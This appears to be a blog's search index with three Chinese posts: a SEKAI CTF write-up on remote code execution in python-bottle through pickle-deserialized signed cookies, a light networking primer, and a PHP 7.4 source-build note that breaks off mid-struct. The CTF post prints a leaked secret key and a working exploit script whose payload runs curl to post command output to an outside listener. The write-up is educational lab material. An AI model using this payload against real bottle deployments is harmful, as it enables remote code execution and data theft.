<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>python-bottle Web框架远程命令执行漏洞浅析</title>
    <url>/2022/10/03/bottle_rce/</url>
    <content><![CDATA[<p>昨天刚结束的<strong>SEKAI CTF</strong>上出现了一道<code>python-bottle</code>框架的题目，在没有找到漏洞相关文章或讨论之前（当然，赛后复盘找到了）成功从零开始拿到了flag，可喜可贺，可喜可贺。在寻找漏洞的过程中深感获益良多，以此文章记录之。跨出了源码审计技能的一大步口牙！</p>
<span id="more"></span>

<h1><span id="开幕加食">开幕加食</span></h1><p>题目环境能直接利用<code>os.path.join</code>的特性造成任意文件读取漏洞，但是不能直接读到flag文件。于是乎先读<code>/proc/self/cmdline</code>定位源码文件，把源码拿到本地分析。</p>
<p>题目的关键代码片段如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> config.secret <span class="keyword">import</span> sekai</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/sign&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=sekai)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=sekai)</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;guest&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;admin&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pls no hax&quot;</span></span><br></pre></td></tr></table></figure>

<p>最开始以为只是单纯的伪造session，拿到admin身份就能结束战斗。</p>
<p>于是首先把目标锁定在了<code>request.get_cookie</code>的<code>secret</code>参数上，想着在本地环境构造出admin的session。</p>
<p>一眼野包，鉴定为假，读取<code>/app/config/secret.py</code>文件拿到 <code>sekai=&quot;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&quot;</code>。</p>
<p>尝试本地构造session</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, response</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/sign&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">        response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=<span class="string">&quot;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8083</span>)</span><br></pre></td></tr></table></figure>

<p>替换Cookie，刷新题目页面</p>
<p><img src="/images/20221002210001.png"></p>
<p>痛，太痛了www</p>
<p>仔细想想也是，目标模板文件就在<code>/app/views/admin.html</code>里躺着，要是flag就在html文件里的话，又能学到什么新姿势呢？</p>
<p>半天寻觅无果后，决定直接分析框架源码。</p>
<h1><span id="静态分析">静态分析</span></h1><p>首先进行静态分析，将重点目标放在了<code>request.get_cookie</code>上。一来要想构造复杂的payload，同时还要满足<code>if</code>语句大概率比较困难，而这是唯一一个无条件进入的函数。二是因为我们能控制的输入点貌似也只有这一处了。</p>
<p>进入<code>request.get_cookie</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">self, key, default=<span class="literal">None</span>, secret=<span class="literal">None</span></span>):</span><br><span class="line">        value = self.cookies.get(key)</span><br><span class="line">        <span class="keyword">if</span> secret <span class="keyword">and</span> value:</span><br><span class="line">            dec = cookie_decode(value, secret) <span class="comment"># (key, value) tuple or None</span></span><br><span class="line">            <span class="keyword">return</span> dec[<span class="number">1</span>] <span class="keyword">if</span> dec <span class="keyword">and</span> dec[<span class="number">0</span>] == key <span class="keyword">else</span> default</span><br><span class="line">        <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br></pre></td></tr></table></figure>

<p><code>self.cookies.get</code>函数套函数比较多，静态分析有点麻，暂时先跳过。</p>
<p>跟进接下来的<code>cookie_decode</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_decode</span>(<span class="params">data, key</span>):</span><br><span class="line">    data = tob(data)</span><br><span class="line">    <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">        sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">            <span class="keyword">return</span> pickle.loads(base64.b64decode(msg))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>当时看到<code>pickle.loads</code>的一瞬间，真切地体会到了什么叫作<strong>复行数十步，豁然开朗</strong>。</p>
<p>要想利用pickle反序列化rce，我们必须得知如何控制<code>msg</code>参数。</p>
<p><code>tob</code>负责转换参数类型为<code>byte</code>，对payload的构造影响几乎可以忽略。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.encode(enc) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, unicode) <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br></pre></td></tr></table></figure>

<p>最搞的是这个<code>cookie_is_encoded</code>判断</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_is_encoded</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(data.startswith(tob(<span class="string">&#x27;!&#x27;</span>)) <span class="keyword">and</span> tob(<span class="string">&#x27;?&#x27;</span>) <span class="keyword">in</span> data)</span><br></pre></td></tr></table></figure>

<p>只要参数值以<code>!</code>开头且存在<code>?</code>，就认为<em>cookie_is_encoded</em>了。23333</p>
<p>此时回想正常服务返回的session格式</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Cookie:</span> name=<span class="string">&quot;!o8siMrdaVf83giE8crJurg==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFZ3Vlc3SUc4aULg==&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>?</code>仅仅起了个分隔符的作用。这也意味着<code>sig</code>和<code>msg</code>参数很大可能就是被分隔开的两段数据。</p>
<p>现在挡在我们面前的，只剩下<code>_lscmp</code>了。</p>
<h1><span id="动态调试">动态调试</span></h1><p><code>_lscmp</code>实现如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_lscmp</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> <span class="built_in">sum</span>(<span class="number">0</span> <span class="keyword">if</span> x==y <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)) <span class="keyword">and</span> <span class="built_in">len</span>(a) == <span class="built_in">len</span>(b)</span><br></pre></td></tr></table></figure>

<p>进行到这一步，静态分析实在难以看清<code>sig</code>和<code>msg</code>两个值之间的联系。参数<code>a</code>好说，而参数<code>b</code>是经过HMAC的md5消息摘要再base64后的<code>msg</code>，并且<code>_lscmp</code>函数的具体流程跟踪也很麻烦。唯一欣慰的是我们拿到了泄漏的<code>key</code>。这种情况下，动态调试是验证之前的猜测和探寻下一步方向的最优解。</p>
<p>本地调试脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/sign&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=<span class="string">&quot;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8083</span>)</span><br></pre></td></tr></table></figure>

<p>我们首先传入正常服务返回的<code>Cookie: name=&quot;!o8siMrdaVf83giE8crJurg==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFZ3Vlc3SUc4aULg==&quot;</code>，跟踪快进到<code>_lscmp</code>函数</p>
<p><img src="/images/20221002195502.png"></p>
<p>调试器也证实了我们之前的参数值猜测。</p>
<p><img src="/images/20221002200210.png"></p>
<p>之后进行消息摘要，快进到加密完成。</p>
<p><img src="/images/20221002200515.png"></p>
<p>此时参数<code>a</code>和<code>b</code>已经计算完成，最终的结果在意料之外，也在情理之中——原来Cookie的<strong>前半部分即后半部分加密后的值</strong>。</p>
<p>既然如此，我们能够手动控制<code>msg</code>参数，也知道了Cookie的构造，已经不用再战斗了（喜</p>
<p>首先控制<code>msg</code>参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;curl -X POST -H \&quot;EVIL:$(ls -al /)\&quot; http://233.33.3.333:2333&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(Exp())))</span><br></pre></td></tr></table></figure>

<p>替换后半部分Cookie传给框架进行加密</p>
<p><img src="/images/20221002202159.png"></p>
<p>得到加密后的<code>b</code>参数值，也即构造Cookie的前半部分。</p>
<p>至此，payload构造完成，开启vps远程监听</p>
<p><img src="/images/20221002202950.png"></p>
<p>可喜可贺，可喜可贺。</p>
<p>最后flag是个可执行文件，将pickle中的命令执行部分替换为<code>/flag</code>就好。</p>
<h1><span id="来自2013的issue">来自2013的issue</span></h1><p>赛后我终于反应过来，不再局限于试图查找此漏洞相关的完整分析文章，转而去查找github上的项目issue是否另有大佬向开发者反映过这种有风险的框架逻辑，终于找到了相关的讨论。</p>
<p><a href="https://github.com/bottlepy/bottle/issues/447">https://github.com/bottlepy/bottle/issues/447</a></p>
<p><img src="/images/20221002204709.png"></p>
<p><a href="https://github.com/bottlepy/bottle/issues/900">https://github.com/bottlepy/bottle/issues/900</a></p>
<p><img src="/images/20221002204857.png"></p>
<p>总结下来，开发者认为这确实是一个有风险的做法，但是在<code>secret key</code>没有泄漏的情况下问题不大。开发者也表示会采纳各位的将pickle改用json的建议，在未来的版本中彻底删除pickle反序列化，以绝后患。</p>
<p>最后，贴上Session-RCE构造的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;curl -X POST -H \&quot;EVIL:$(ls -al /)\&quot; http://233.33.3.333:2333&#x27;)&quot;</span>,)) <span class="comment"># rce</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit</span>(<span class="params">secret_key</span>):</span><br><span class="line">    msg = base64.b64encode(pickle.dumps(Exp()))</span><br><span class="line">    hashed = hmac.new(<span class="built_in">bytes</span>(secret_key), msg, digestmod=hashlib.md5).digest()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;!&quot;</span> + base64.b64encode(hashed) + <span class="string">b&quot;?&quot;</span> + msg</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(build_exploit(<span class="string">b&quot;your_secret_key&quot;</span>)) <span class="comment"># secret key</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>python-bottle</tag>
        <tag>python-pickle</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络概念入门</title>
    <url>/2022/03/09/computer_networks_basic/</url>
    <content><![CDATA[<p>时隔半个月断断续续，润掉四节坐牢历史课，终于结束了这篇新文章（瘫</p>
<span id="more"></span>

<p><a href="https://mp.weixin.qq.com/s/jiPMUk6zUdOY6eKxAjNDbQ">如果让你来设计网络</a>这篇文章是写得真的十分清楚，是超赞的入门基础篇，为这篇水文（悲）提供了大量的资料和指导。</p>
<p>真的十分感谢原作者呀！</p>
<h1><span id="hub集线器">Hub/集线器</span></h1><p>在它被应用之前，两台计算机<del>为了分享黄油合集</del>要建立通信，就得用网线直接将它们相连，其实貌似也只有这种办法了。</p>
<p>很快，更多的绅士们找到了黄油的来源，然后互相连起了网线，交流游van心door。</p>
<p>随着加入战斗的绅士越来越多，大家发现身上的网口开得实在有点多了，线也交错在一起，根本不好维护。</p>
<p><img src="/images/202203162155624.png"></p>
<p>即使我们真有这么多根网线，计算机也没有这么多网口的说。</p>
<p>这时一群有志于将黄油分享给全地球人的勇士们站了出来，发明了一个中间设备，起名给它叫做<strong>集线器</strong>。</p>
<p><img src="/images/202203162154454.png"></p>
<p>大家仅需把网线连在它的身上就好，随着网口和网线数量的减少，一切都变得有序了起来。</p>
<p>这个设备的工作只是负责转发，将收到的数据包<strong>广播</strong>给所有出口，仅此而已。</p>
<p>所以，为了让其余计算机得知发来的数据包究竟是不是自己该收下的那个，我们还需要一个身份证。</p>
<h1><span id="media-access-control物理地址">Media Access Control/物理地址</span></h1><p>也叫MAC地址，<strong>全球唯一</strong>。大概长<em>00:0C:29:CA:E4:66</em>这样，由网络设备制造商生产时烧录在网卡里。</p>
<blockquote>
<p>硬件的MAC地址是厂家按照一定的规则，进行设置所产生的，因此，MAC地址拥有自己的格式。</p>
<p>MAC 地址采用十六进制数表示，共 6 个字节（48 位），长度为 48bit（字节）。整个地址可以分为前 24 位和后 24 位，代表不同的含义。</p>
<p>前 24 位称为组织唯一标识符（Organizationally Unique Identifier，OUI），是由 IEEE 的注册管理机构给不同厂家分配的代码，区分了不同的厂家。</p>
<p>后 24 位是由厂家自己分配的，称为扩展标识符。同一个厂家生产的网卡中 MAC 地址后 24 位是不同的。</p>
</blockquote>
<p>利用这个全球唯一的特性，计算机在发送数据包时，只要在头部再拼接一点数据就好。</p>
<p><img src="/images/202203162155341.png"></p>
<p>其余计算机收到数据包后，根据头部的MAC地址信息，判断是否确实是发给自己的，就可以选择是<strong>收下</strong>还是<strong>丢弃</strong>了。</p>
<p>虽然集线器使整个布局干净不少，但原来只发给某台计算机的消息，现在却要发给连接到集线器中的所有设备，来，騙！（指大量垃圾数据包），来，偷袭！（指占用过多带宽）这好吗？这不好。更重要的是，这并不安全。</p>
<p>我劝！这位年轻集线器，耗子尾汁。</p>
<h1><span id="switch交换机">Switch/交换机</span></h1><p>要是集线器再智能一点，只会发包给目标MAC地址指向的那台计算机就又能解决大部分问题了。于是勇士们又发明了<strong>交换机</strong>。</p>
<p>交换机内部维护一张MAC地址表，记录着每一个MAC地址的设备，连接在其哪一个端口上。</p>
<p><img src="/images/202203162156314.png"></p>
<p>嘛，最开始的时候这张表必定是空的，这恒河里。但它逐步建立的过程也很好理解。</p>
<p>我们发送如下数据包</p>
<p><img src="/images/202203162155341.png"></p>
<p>已知此包从1号端口进，于是交换机记下</p>
<p>MAC：aa-aa-aa-aa-aa-aa-aa<br>端口：1</p>
<p>交换机在查看地址表发现没有目标映射，故技重施，将此包广播出去。</p>
<p>之后，目标计算机收到了此包，于是做出<strong>响应</strong>告诉交换机，交换机也会再发给我们发送一个响应信号，告诉双方：我滴任务，完成啦！啊哈哈哈哈哈哈（突发恶疾）</p>
<p>由于响应从2号端口进，于是交换机再记下</p>
<p>MAC：bb-bb-bb-bb-bb-bb<br>端口：2</p>
<p>如此各台计算机通信多次，地址表便建立完成。</p>
<p>就像我们小时候玩插座一样，总想着要是一个插座要能接到另一个插座里，就能用一个插孔换另一个插座数量的设备了。</p>
<p>我们完全不需要设计额外的东西，只需要按照之前的规矩来，按照上图的接线方式即可完成所有计算机的互联，所以交换机设计的这种布局，其实真的很巧妙。</p>
<p>最终，两个交换机将分别记录 A ~ H 所有机器的映射记录。</p>
<p><img src="/images/202203162200467.png"></p>
<p>这种设计在局域网内有几十甚至几百台电脑的时候，都能很好地工作，所以这种基于交换机的网络设计模式，支撑了好一阵子。</p>
<h1><span id="router路由器">Router/路由器</span></h1><p>但谁都没有想到，计算机在地球上的发展速度实在是太快，太快。数量很快就到了几万、几十万、几百万，交换机的地址表已经无法记录如此庞大的映射关系了。</p>
<p>很明显，问题就在于一台交换机连到另一台交换机上的那根线。千千万万个设备连接在一起，使地址表逐渐大得离谱。我们需要另增一个设备再次帮忙作转发。</p>
<p>这个设备就是路由器。作为一台每个端口都独立拥有MAC地址的设备，会帮我们把数据包再做一次转发。</p>
<p><img src="/images/202203162203659.png"></p>
<p>但是，现在我们想从主机A给主机C发送数据，单靠MAC地址的话，似乎不太行的通了。</p>
<p>因为交换机的工作仅着眼于MAC地址，一查地址表没有，广播后更是没有回应，它就光速进行一个班的下，表示我什么都做不到（指把包原封不动地还给你）。</p>
<p>这我们还指望路由器帮忙转发呢，看来得提前让主机自己判断一下，目标跟自己是不是在同一台交换机下才行。</p>
<h1><span id="ip互联网协议地址">IP/互联网协议地址</span></h1><blockquote>
<p>于是你发明了一个新的地址，给每一台机器一个 32 位的编号，如：</p>
<p>11000000101010000000000000000001</p>
<p>你觉得有些不清晰，于是把它分成四个部分，中间用点相连。</p>
<p>11000000.10101000.00000000.00000001</p>
<p>你还觉得不清晰，于是把它转换成 10 进制。</p>
<p>192.168.0.1</p>
<p>最后你给了这个地址一个响亮的名字，IP 地址。现在每一台电脑，同时有自己的 MAC 地址，又有自己的 IP 地址，只不过 IP 地址是软件层面上的，可以随时修改，MAC 地址一般是无法修改的。</p>
<p>这样一个可以随时修改的 IP 地址，就可以根据你规划的网络拓扑结构，来调整了。</p>
</blockquote>
<p><img src="/images/202203162206381.png"></p>
<p>这时我们（主机A）可以说：</p>
<p><em>只要目标IP地址不为192.168.0开头，就全部发送给到路由器吧，之后再怎么转发，交给它！</em></p>
<p>太妙了！</p>
<p>这样一来，数据包的头部就被拼上了路由器的MAC地址。</p>
<p>现在两个设备之间的数据传输，得再加上一个头部了。</p>
<p><img src="/images/202203162205057.png"></p>
<h1><span id="subnet子网-subnet-mask子网掩码">Subnet/子网 Subnet Mask/子网掩码</span></h1><p>刚刚我们提到，<em>只要目标IP地址不为192.168.0开头</em>，其实就是在判断目标主机是否和自己在同一个<strong>子网</strong>下。</p>
<p>子网的划分是人为规定的，目的是将物理网络重构为逻辑网络，方便管理和提高安全性。</p>
<p>那对于计算机来说，就是通过<strong>子网掩码</strong>来做出判断的。</p>
<p>拿最常见的例子，<em>255.255.255.0</em>来说，即表示前24位正是子网所在的网段。</p>
<p>将其与自身IP、目标IP各作<code>&amp;</code>位运算：</p>
<p>192.168.0.1 <code>&amp;</code> 255.255.255.0<br>= 11000000.10101000.00000000.00000001 <code>&amp;</code> 11111111.11111111.11111111.00000000<br>= 11000000.10101000.00000000.00000000<br>= 192.168.0.0</p>
<p>192.168.1.1 <code>&amp;</code> 255.255.255.0<br>= 11000000.10101000.00000001.00000001 <code>&amp;</code> 11111111.11111111.11111111.00000000<br>= 11000000.10101000.00000001.00000000<br>= 192.168.1.0</p>
<p>计算机得知，我在192.168.0.0网段，他在192.168.1.0网段，于是我要发给路由器，就是这么简洁且易懂。</p>
<blockquote>
<p>其实说发给路由器不准确，应该说 A 会把包发给默认网关。</p>
<p>对 A 来说，A 只能直接把包发给同处于一个子网下的某个 IP 上，所以发给路由器还是发给某个电脑，对 A 来说也不关心，只要这个设备有个 IP 地址就行。</p>
<p>所以默认网关，就是 A 在自己电脑里配置的一个 IP 地址，以便在发给不同子网的机器时，发给这个 IP 地址。</p>
</blockquote>
<h1><span id="routing-table路由表">Routing Table/路由表</span></h1><blockquote>
<p>路由器收到的数据包有目的 IP 也就是 C 的 IP 地址，需要转化成从自己的哪个端口出去，很容易想到，应该有个表，就像 MAC 地址表一样。</p>
<p>这个表就叫路由表。</p>
<p>不同于 MAC 地址表的是，路由表并不是一对一这种明确关系。</p>
</blockquote>
<p><img src="/images/202203162217267.png"></p>
<p>路由表就表示，192.168.0这个网段的，都转发到0号端口，192.168.1这个网段的，都转发到1号端口。</p>
<p>但路由表的生成可不像MAC表那么简单的说，它是由复杂的<a href="https://www.jianshu.com/p/cf74e5eab2c7">路由算法</a>生成的。</p>
<p>这里还有一列叫做<strong>下一跳</strong>的数据，这是在路由器连接到另一台路由器上时存在的。</p>
<h1><span id="address-resolution-protocol地址解析协议">Address Resolution Protocol/地址解析协议</span></h1><p>那现在假设我们的数据包经过重重转乘，终于来到了海的那边（指另一个子网），作为一名初来乍到的数据，它是怎么知道目标IP的MAC地址，从而通过交换机发过去的呢？</p>
<p>故技重施嘛，我们的电脑里还存在一张缓存表，表中记录着IP与MAC地址的映射关系，这就是<strong>ARP协议</strong>用到的的<strong>ARP协议缓存表</strong>。</p>
<blockquote>
<p>A封装好要发送的信息，在要写“收件地址”时，A会用子网掩码进行计算先判断C和A自己在不在同一个网段，这时候A知道了C和自己不在一个网段，</p>
<p>这时候，A知道该用网关把自己的数据传递给C，所以A会发送一个ARP包来获取网关的MAC地址，</p>
<p>网关收到ARP包后，把自己的MAC地址封装在ARP包中，发送给A，</p>
<p>A封装报文，目标MAC地址写网关的MAC地址，</p>
<p>网关收到报文，发现是给自己发的，就开始解包，解开之后，发现是给另一个网段的主机发送的，</p>
<p>此时如果网关本身就是路由器就直接把数据报文发送给下一跳路由器，如果网关是普通的PC，就发送给路由器，由路由器发送给下一跳路由器，目标MAC写下一跳路由器的MAC地址，</p>
<p>历经千辛万苦，报文终于到达C的主机的路由器，路由器发送报文到C所在网段的网关，C网段的网关解包之后发现不是给自己，而是给自己网段内的C主机，就发送报文给C了。</p>
</blockquote>
<p><img src="/images/202203162210708.png"></p>
<p>这样大家不断广播ARP请求，最终所有主机里面都会将ARP缓存表完善。</p>
<p>至此，我们的黄油网络终于算有点样子了。</p>
<p>所以我们要不忘初心，速速发我以黄油（bushi</p>
<p>最后附上一张用于总结复现的网络拓扑图</p>
<p><img src="/images/202203162212810.png"></p>
]]></content>
      <tags>
        <tag>Computer Networks</tag>
      </tags>
  </entry>
  <entry>
    <title>php74内核源码阅读——开始之前</title>
    <url>/2022/11/01/php74k1/</url>
    <content><![CDATA[<p>《深入理解php内核》笔记。这个系列将会对php7.4.30版本的部分源码进行分析。</p>
<span id="more"></span>

<h1><span id="环境搭建">环境搭建</span></h1><p>本地编译出的php会留下符号表，后期调试时可以进行源码级别的调试，会方便很多。</p>
<p>以本机的php-7.4.30为例，在github上可以获取对应版本的源码<sup>[1]</sup>。执行代码根目录的buildconf脚本以生成所需要的构建脚本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&gt; cd ~/php-src</span><br><span class="line">$&gt; ./buildconf</span><br></pre></td></tr></table></figure>

<p>执行完以后就可以开始执行configure了，通过 <strong>--disable-all</strong> 选项编译一个最精简的php。如果configure脚本出现错误，可能是缺少php所依赖的库，各个系统的环境可能不一样，缺啥下啥就好。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&gt; ./configure --disable-all</span><br><span class="line">$&gt; make</span><br></pre></td></tr></table></figure>

<p>make执行完以后，在sapi/cli目录里就已经有了php的可执行文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&gt; ./sapi/cli/php -v</span><br><span class="line">php 7.4.30 (cli) (built: Oct  5 2022 17:29:46) ( NTS )</span><br><span class="line">Copyright (c) The php Group</span><br><span class="line">Zend Engine v3.4.0, Copyright (c) Zend Technologies</span><br></pre></td></tr></table></figure>

<h1><span id="主要目录结构">主要目录结构</span></h1><ul>
<li><p>build -- 和编译有关的目录。主要放置一些和源码编译相关的一些文件，还有一些检查环境的脚本等，里面包括wk，awk和sh脚本用于编译处理，其中m4文件是linux下编译程序自动生成的文件，可以使用buildconf命令操作具体的配置文件。</p>
</li>
<li><p>ext -- 官方扩展目录，包括了绝大多数php的函数的定义和实现，如<code>array</code>系列，<code>pdo</code>系列，<code>spl</code>系列等函数的实现，个人写的扩展在测试时也可以放到这个目录，方便测试和调试。ext_skel.php为扩展项目生成脚本。</p>
</li>
<li><p>main -- 主目录，存放php最为核心的文件，包含php的主要宏定义文件，其中 php.h 包含绝大部分php宏及 phpAPI 定义。</p>
</li>
<li><p>pear -- php扩展与应用库。代码由php实现，逐渐被 composer 取代。</p>
</li>
<li><p>sapi -- 包含了各种服务器抽象层的代码，例如apache的mod_php，cgi，fastcgi以及fpm等等接口。</p>
</li>
<li><p>scripts -- linux下的脚本目录。</p>
</li>
<li><p>tests -- 测试脚本目录，主要是 phpt 脚本。</p>
</li>
<li><p>TSRM -- 线程安全资源管理器，保证在单线程和多线程模型下的线程安全和代码一致性。</p>
</li>
<li><p>win32 -- 这个目录主要包括Windows平台相关的一些实现，比如sokcet的实现在Windows下和*Nix平台就不太一样。</p>
</li>
<li><p>Zend -- 包含Zend引擎的所有文件，包括php的生命周期，内存管理，变量定义和赋值以及函数宏定义等等。</p>
</li>
</ul>
<h1><span id="php全局变量宏">php全局变量宏</span></h1><p>php运行时的一些全局变量为存放在mian文件夹下php_globals.h头文件中的一个结构体里。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">php_core_globals</span> &#123;</span></span><br><span class="line">    zend_bool implicit_flush; <span class="comment">// 是否要求php输出层在每个输出块之后自动刷新数据</span></span><br><span class="line"></span><br><span class="line">    zend_long output_buffering; <span class="comment">// 输出缓冲区大小</span></span><br><span class="line"></span><br><span class="line">    zend_bool enable_dl; <span class="comment">// 是否允许使用dl()函数</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *output_handler; <span class="comment">// 将所有脚本的输出重定向到一个输出处理函数</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *unserialize_callback_func; <span class="comment">// 如果反序列化处理器需要实例化一个未定义的类，指定的回调函数将以该未定义类的名字作为参数被unserialize()调用</span></span><br><span class="line">    zend_long serialize_precision;   <span class="comment">// 将浮点型和双精度型数据序列化存储时的精度（即有效位数）</span></span><br><span class="line"></span><br><span class="line">    zend_long memory_limit;   <span class="comment">// 一个脚本所能申请到的最大内存字节数</span></span><br><span class="line">    zend_long max_input_time; <span class="comment">// 每个脚本解析输入数据（POST, GET, upload）的最大允许时间</span></span><br><span class="line"></span><br><span class="line">    zend_bool track_errors;           <span class="comment">// 是否在变量$php_errormsg中保存最近一个错误或警告消息</span></span><br><span class="line">    zend_bool display_errors;         <span class="comment">// 是否将错误信息作为输出的一部分显示</span></span><br><span class="line">    zend_bool display_startup_errors; <span class="comment">// 是否显示php启动时的错误</span></span><br><span class="line">    zend_bool log_errors;             <span class="comment">// 是否在日志文件里记录错误</span></span><br><span class="line">    zend_long log_errors_max_len;     <span class="comment">// 设置错误日志中附加的与错误信息相关联的错误源的最大长度</span></span><br><span class="line">    zend_bool ignore_repeated_errors; <span class="comment">// 记录错误日志时是否忽略重复的错误信息</span></span><br><span class="line">    zend_bool ignore_repeated_source; <span class="comment">// 记录错误日志时是否忽略重复的错误源</span></span><br><span class="line">    zend_bool report_memleaks;        <span class="comment">// 是否报告内存泄漏</span></span><br><span class="line">    <span class="type">char</span> *error_log;                  <span class="comment">// 